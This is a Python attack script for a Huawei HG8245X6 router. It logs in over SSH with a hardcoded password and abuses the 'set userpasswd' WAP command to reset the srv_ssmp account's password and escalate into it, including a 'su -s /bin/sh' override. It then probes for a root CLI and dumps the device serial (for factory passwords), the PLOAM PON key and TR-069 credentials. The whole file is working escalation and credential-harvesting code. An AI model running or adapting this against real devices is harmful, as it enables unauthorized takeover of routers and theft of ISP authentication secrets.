#!/usr/bin/env python3
"""
Phase 9: Use 'set userpasswd' WAP CLI command to change srv_ssmp password!
Found in SU_WAP> command list. This is the key to escalation.
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"
NEW_PWD = "Admin1234!"  # New password for srv_ssmp

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_wap(chan, cmd, timeout=10):
    """Send command to WAP prompt and return output."""
    chan.send(cmd + "\n")
    out = recv_until(chan, ["SU_WAP>", "WAP>"], timeout)
    lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
    for l in lines:
        if cmd[:20] not in l:
            print(f"  {l}")
    return out

def send_shell(chan, cmd, timeout=15):
    """Send command to BusyBox shell prompt."""
    chan.send(cmd + "\n")
    out = recv_until(chan, ["# "], timeout)
    lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
    for l in lines:
        if cmd[:20] not in l:
            print(f"  {l}")
    return out

def connect_to_wap():
    """Connect and get to SU_WAP> prompt."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    print("[+] SU_WAP> prompt obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - srv_ssmp: 'set userpasswd' Escalation")
    print("=" * 62)

    client, chan = connect_to_wap()

    # ── 1. Check 'set userpasswd' syntax ──────────────────────
    print("[*] Checking 'set userpasswd' command help:")
    send_wap(chan, "set userpasswd ?")
    send_wap(chan, "set userpasswd")

    # ── 2. Try setting srv_ssmp password ─────────────────────
    print(f"\n[*] Setting srv_ssmp password to '{NEW_PWD}':")
    # Try different possible syntaxes
    for syntax in [
        f"set userpasswd srv_ssmp {NEW_PWD}",
        f"set userpasswd username srv_ssmp password {NEW_PWD}",
        f"set userpasswd user srv_ssmp {NEW_PWD}",
    ]:
        print(f"  Trying: {syntax}")
        chan.send(syntax + "\n")
        out = recv_until(chan, ["SU_WAP>", "success", "fail", "error", "ERROR", "OK"], timeout=8)
        print(f"  Result: {out.strip()[-200:]}")
        if "success" in out.lower() or "OK" in out:
            print(f"  [+] SUCCESS with syntax: {syntax}")
            break
        if "not exist" in out.lower() or "ERROR" in out:
            print(f"  [-] Failed with: {syntax}")

    # ── 3. Test by trying su srv_ssmp with new password ───────
    print(f"\n[*] Entering shell to test su srv_ssmp...")
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    
    print(f"[*] Testing su srv_ssmp with '{NEW_PWD}':")
    chan.send("su srv_ssmp\n")
    out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
    print(f"  {out.strip()[-100:]}")
    
    if "Password" in out:
        chan.send(f"{NEW_PWD}\n")
        out = recv_until(chan, ["# ", "$ ", "incorrect", "false"], timeout=8)
        print(f"  Auth result: {out.strip()[-200:]}")
        if "incorrect" not in out.lower() and "false" not in out.lower():
            print("\n  [+] ✓✓✓ SUCCESS! We are now srv_ssmp! ✓✓✓")
            chan.send("id\n")
            out = recv_until(chan, "# ", timeout=5)
            print(f"  {out.strip()}")
            chan.send("cat /proc/self/status | grep -E 'Uid|Gid|Cap'\n")
            out = recv_until(chan, "# ", timeout=5)
            print(f"  {out.strip()}")
            # Explore what srv_ssmp can do
            chan.send("ls -la / 2>&1\n")
            out = recv_until(chan, "# ", timeout=5)
            print(f"  {out.strip()}")
        else:
            print("  [-] Password failed or shell is /bin/false")
            # Try with -s flag to override shell
            chan.send("su -s /bin/sh srv_ssmp\n")
            out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
            if "Password" in out:
                chan.send(f"{NEW_PWD}\n")
                out = recv_until(chan, ["# ", "$ ", "incorrect"], timeout=8)
                print(f"  With -s flag: {out.strip()[-200:]}")
                if "incorrect" not in out.lower() and ("# " in out or "$ " in out):
                    print("  [+] ✓ SUCCESS with -s flag!")
                    chan.send("id\n")
                    out = recv_until(chan, "# ", timeout=5)
                    print(f"  {out.strip()}")

    # ── 4. Also check other user-related WAP commands ─────────
    # Go back to SU_WAP>
    chan.send("exit\n")
    recv_until(chan, "SU_WAP>", timeout=5)

    print("\n[*] Exploring more WAP commands for user management:")
    send_wap(chan, "display sysinfo")
    send_wap(chan, "display system info")
    
    # ── 5. Try 'set apssh' and 'set aptelnet' ─────────────────
    print("\n[*] Trying set apssh (might open root SSH):")
    send_wap(chan, "set apssh ?")
    send_wap(chan, "set apssh")

    # ── 6. Try 'session cli' to get root CLI ──────────────────
    print("\n[*] Trying 'session cli' command:")
    chan.send("session cli\n")
    out = recv_until(chan, ["SU_WAP>", "cli>", "CLI>", "#"], timeout=8)
    print(f"  {out.strip()[-300:]}")

    # ── 7. 'wap ps' - show all running processes ──────────────
    print("\n[*] wap ps:")
    send_wap(chan, "wap ps")

    # ── 8. 'display sn' - Serial Number (for factory password) ─
    print("\n[*] display sn:")
    send_wap(chan, "display sn")

    # ── 9. display ploam-password (PON authentication key) ─────
    print("\n[*] display ploam-password:")
    send_wap(chan, "display ploam-password")

    # ── 10. display tr069 info (might have CWMP credentials) ──
    print("\n[*] display tr069 info:")
    send_wap(chan, "display tr069 info")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
